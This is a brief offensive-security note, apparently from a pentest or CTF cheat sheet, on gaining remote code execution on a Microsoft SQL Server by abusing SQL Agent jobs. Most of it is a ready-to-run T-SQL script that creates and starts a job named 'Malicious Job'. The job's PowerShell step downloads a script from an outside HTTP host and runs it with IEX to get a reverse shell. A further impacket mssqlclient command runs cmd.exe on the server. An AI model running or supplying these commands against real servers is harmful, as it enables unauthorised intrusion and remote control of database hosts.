It is possible to gain *RCE(Remote Code Execution)* on a MSSql server via a malicious SQL Agent job.

## Attack
You can use the following code to create a SQL Agent job that executes a malicious Power-shell reverse shell via *download&execute* over HTTP server.
```sql
USE msdb;  
GO

EXEC sp_add_job  
    @job_name = N'Malicious Job';
GO

EXEC sp_add_jobstep  
    @job_name = N'Malicious Job',
    @step_name = N'Execute PowerShell Script',
    @subsystem = N'PowerShell',
    @command = N'(New-Object Net.WebClient).DownloadString("http://10.10.14.104/a")|IEX;',
    @retry_attempts = 5,
    @retry_interval = 5;
GO

EXEC sp_add_jobserver  
    @job_name = N'Malicious Job';
GO

EXEC sp_start_job
    @job_name = N'Malicious Job';
GO
```
**OBS:** the user set as running the *SQLAgent* on the back-end will be the user spawn in the reverse shell. If the sysadmin didn't specify a specific service account **NTService** will be spawn.

Same can be obtained directly by using impacketer's **mssqlclient.py**.
```shell-session
SQL (sa  dbo@master)> sp_start_job cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"
```